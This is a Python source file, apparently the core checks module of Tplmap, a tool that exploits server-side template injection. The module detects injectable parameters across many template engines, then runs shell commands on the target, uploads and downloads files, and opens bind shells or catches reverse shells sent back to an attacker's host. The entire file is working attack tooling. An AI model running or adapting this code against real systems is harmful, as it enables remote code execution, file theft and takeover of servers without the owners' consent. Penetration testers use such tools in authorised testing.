from plugins.engines.mako import Mako
from plugins.engines.jinja2 import Jinja2
from plugins.engines.smarty import Smarty
from plugins.engines.twig import Twig
from plugins.engines.freemarker import Freemarker
from plugins.engines.velocity import Velocity
from plugins.engines.jade import Jade
from plugins.engines.nunjucks import Nunjucks
from plugins.engines.dust import Dust
from plugins.engines.dot import Dot
from plugins.engines.marko import Marko
from plugins.languages.javascript import Javascript
from plugins.languages.php import Php
from plugins.languages.python import Python
from core.channel import Channel
from utils.loggers import log
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
import time
import telnetlib
import urlparse
import socket

class Checks:

    plugins = [
        Smarty,
        Mako,
        Jinja2,
        Twig,
        Freemarker,
        Velocity,
        Jade,
        Nunjucks,
        Dot,
        Dust,
        Marko,
        Javascript,
        Php,
        Python,
    ]
    
    def __init__(self, channel):
        self.channel = channel

    def _print_injection_summary(self):

        prefix = self.channel.data.get('prefix', '').replace('\n', '\\n')
        render = self.channel.data.get('render', '%(code)s').replace('\n', '\\n') % ({'code' : '*' })
        suffix = self.channel.data.get('suffix', '').replace('\n', '\\n')

        if self.channel.data.get('evaluate_blind'):
            evaluation = 'yes, %s code (blind)' % (self.channel.data.get('language'))
        elif self.channel.data.get('evaluate'):
            evaluation = 'yes, %s code' % (self.channel.data.get('language'))
        else:
            evaluation = 'no'

        if self.channel.data.get('execute_blind'):
            execution = 'yes (blind)'
        elif self.channel.data.get('execute'):
            execution = 'yes'
        else:
            execution = 'no'

        if self.channel.data.get('write'):
            if self.channel.data.get('blind'):
                writing = 'yes (blind)'
            else:
                writing = 'yes'
        else:
            writing = 'no'

        log.info("""Tplmap identified the following injection point:

      %(method)s parameter: %(parameter)s
      Engine: %(engine)s
      Injection: %(prefix)s%(render)s%(suffix)s
      Context: %(context)s
      OS: %(os)s
      Technique: %(injtype)s
      Capabilities:

       Code evaluation: %(evaluate)s
       Shell command execution: %(execute)s
       File write: %(write)s
       File read: %(read)s
       Bind and reverse shell: %(bind_shell)s
    """ % ({
        'prefix': prefix,
        'render': render,
        'suffix': suffix,
        'context': 'text' if (not prefix and not suffix) else 'code',
        'engine': self.channel.data.get('engine').capitalize(),
        'os': self.channel.data.get('os', 'undetected'),
        'injtype' : 'blind' if self.channel.data.get('blind') else 'render',
        'evaluate': evaluation,
        'execute': execution,
        'write': writing,
        'read': 'no' if not self.channel.data.get('read') else 'yes',
        'bind_shell': 'no' if not self.channel.data.get('bind_shell') else 'yes',
        'method': self.channel.injs[self.channel.inj_idx]['field'],
        'parameter': self.channel.injs[self.channel.inj_idx]['param']
    }))

    def detect_template_injection(self, plugins = plugins):

        # Loop manually the self.channel.injs modifying self.channel's inj_idx
        for i in xrange(len(self.channel.injs)):

            log.info("Testing if %s parameter '%s' is injectable" % (
                self.channel.injs[self.channel.inj_idx]['field'],
                self.channel.injs[self.channel.inj_idx]['param']
                )
            )

            current_plugin = None

            # Iterate all the available plugins until
            # the first template engine is detected.
            for plugin in self.plugins:

                current_plugin = plugin(self.channel)

                # Skip if user specify a specific --engine
                if self.channel.args.get('engine') and self.channel.args.get('engine').lower() != current_plugin.plugin.lower():
                    continue

                current_plugin.detect()

                if self.channel.data.get('engine'):
                    return current_plugin

            self.channel.inj_idx += 1

    def check_template_injection(self):

        current_plugin = self.detect_template_injection(self.channel)

        # Kill execution if no engine have been found
        if not self.channel.data.get('engine'):
            log.fatal("""Tested parameters appear to be not injectable. Try to increase '--level' value to perform more tests.""")
            return

        # Print injection summary
        self._print_injection_summary()

        # If actions are not required, prints the advices and exit
        if not any(
                f for f,v in self.channel.args.items() if f in (
                    'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'bind_shell', 'reverse_shell'
                ) and v
            ):

            log.info(
                """Rerun tplmap providing one of the following options:\n%(execute)s%(write)s%(read)s%(bind_shell)s%(reverse_shell)s%(execute_blind)s""" % (
                    {
                     'execute': '\n    --os-shell or --os-cmd to execute shell commands via the injection' if self.channel.data.get('execute') and not self.channel.data.get('execute_blind') else '',
                     'bind_shell': '\n    --bind-shell PORT to bind a shell on a port and connect to it' if self.channel.data.get('bind_shell') else '',
                     'reverse_shell': '\n    --reverse-shell HOST PORT to run a shell back to the attacker\'s HOST PORT' if self.channel.data.get('reverse_shell') else '',
                     'write': '\n    --upload LOCAL REMOTE to upload files to the server' if self.channel.data.get('write') else '',
                     'read': '\n    --download REMOTE LOCAL to download remote files' if self.channel.data.get('read') else '',
                     'execute_blind': '\n    --os-cmd or --os-shell to execute blind shell commands on the underlying operating system' if self.channel.data.get('execute_blind') else '',
                     }
                )
            )

            return


        # Execute operating system commands
        if self.channel.args.get('os_cmd') or self.channel.args.get('os_shell'):

            # Check the status of command execution capabilities
            if self.channel.data.get('execute_blind'):
                log.info("""Blind injection has been found and command execution will not produce any output.""")
                log.info("""Delay is introduced appending '&& sleep <delay>' to the shell commands. True or False is returned whether it returns successfully or not.""")

                if self.channel.args.get('os_cmd'):
                    print current_plugin.execute_blind(self.channel.args.get('os_cmd'))
                elif self.channel.args.get('os_shell'):
                    log.info('Run commands on the operating system.')
                    Shell(current_plugin.execute_blind, '%s (blind) $ ' % (self.channel.data.get('os', ''))).cmdloop()

            elif self.channel.data.get('execute'):
                if self.channel.args.get('os_cmd'):
                    print current_plugin.execute(self.channel.args.get('os_cmd'))
                elif self.channel.args.get('os_shell'):
                    log.info('Run commands on the operating system.')

                    Shell(current_plugin.execute, '%s $ ' % (self.channel.data.get('os', ''))).cmdloop()

            else:
                log.error('No system command execution capabilities have been detected on the target.')


        # Execute template commands
        if self.channel.args.get('tpl_code') or self.channel.args.get('tpl_shell'):

            if self.channel.data.get('engine'):

                if self.channel.data.get('blind'):
                    log.info("""Only blind execution has been found. Injected template code will not produce any output.""")
                    call = current_plugin.inject
                else:
                    call = current_plugin.render

                if self.channel.args.get('tpl_code'):
                    print call(self.channel.args.get('tpl_code'))
                elif self.channel.args.get('tpl_shell'):
                    log.info('Inject multi-line template code. Press ctrl-D to send the lines')
                    MultilineShell(call, '%s > ' % (self.channel.data.get('engine', ''))).cmdloop()

            else:
                    log.error('No code evaluation capabilities have been detected on the target')


        # Perform file upload
        local_remote_paths = self.channel.args.get('upload')
        if local_remote_paths:

            if self.channel.data.get('write'):

                local_path, remote_path = local_remote_paths

                with open(local_path, 'rb') as f:
                    data = f.read()

                current_plugin.write(data, remote_path)

            else:
                    log.error('No file upload capabilities have been detected on the target')

        # Perform file read
        remote_local_paths = self.channel.args.get('download')
        if remote_local_paths:

            if self.channel.data.get('read'):

                remote_path, local_path = remote_local_paths

                content = current_plugin.read(remote_path)

                with open(local_path, 'wb') as f:
                    f.write(content)

            else:

                log.error('No file download capabilities have been detected on the target')

        # Connect to tcp shell
        bind_shell_port = self.channel.args.get('bind_shell')
        if bind_shell_port:

            if self.channel.data.get('bind_shell'):

                urlparsed = urlparse.urlparse(self.channel.base_url)
                if not urlparsed.hostname:
                    log.error("Error parsing hostname")
                    return

                for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port)):

                    log.info('Spawn a shell on remote port %i with payload %i' % (bind_shell_port, idx+1))

                    thread.join(timeout=1)

                    if not thread.isAlive():
                        continue

                    try:

                        telnetlib.Telnet(urlparsed.hostname, bind_shell_port, timeout = 5).interact()

                        # If telnetlib does not rise an exception, we can assume that
                        # ended correctly and return from `run()`
                        return
                    except Exception as e:
                        log.debug(
                            "Error connecting to %s:%i %s" % (
                                urlparsed.hostname,
                                bind_shell_port,
                                e
                            )
                        )

            else:

                log.error('No TCP shell opening capabilities have been detected on the target')

        # Accept reverse tcp connections
        reverse_shell_host_port = self.channel.args.get('reverse_shell')
        if reverse_shell_host_port:
            host, port = reverse_shell_host_port
            timeout = 5

            if self.channel.data.get('reverse_shell'):

                current_plugin.reverse_shell(host, port)

                # Run tcp server
                try:
                    tcpserver = TcpServer(int(port), timeout)
                except socket.timeout as e:
                        log.error("No incoming TCP shells after %is, quitting." % (timeout))


            else:

                log.error('No reverse TCP shell capabilities have been detected on the target')
